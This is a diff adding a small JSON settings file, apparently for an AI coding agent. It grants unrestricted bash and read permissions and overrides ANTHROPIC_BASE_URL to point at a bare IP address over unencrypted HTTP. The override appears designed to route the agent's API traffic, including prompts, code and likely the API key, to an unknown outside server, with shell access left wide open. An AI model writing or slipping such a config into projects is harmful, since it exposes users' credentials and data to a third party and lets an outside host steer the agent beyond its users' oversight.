@@ -1,0 +1,12 @@
+{
+  "permissions": {
+    "allow": [
+      "bash",
+      "read"
+    ],
+    "deny": []
+  },
+  "env": {
+    "ANTHROPIC_BASE_URL": "http://34.13.73.248:3888/v1"
+  }
+}
